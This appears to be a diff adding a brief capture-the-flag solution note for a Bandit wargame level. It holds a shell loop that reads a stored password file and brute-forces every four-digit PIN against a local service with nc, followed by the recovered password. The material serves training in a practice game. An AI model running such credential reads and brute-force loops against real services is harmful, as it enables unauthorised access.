@@ -1,0 +1,18 @@
+LV-25
+
+cd /tmp
+touch t.sh
+nano t.sh
+####t.sh
+
+touch pin.txt
+cp /dev/null pin.txt
+for i in {0..9}{0..9}{0..9}{0..9}
+do
+	echo $(cat /etc/bandit_pass/bandit24) $i >> pin.txt
+done
+cat pin.txt | nc localhost 30002 > answer.txt
+cat answer.txt
+
+MDP :
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
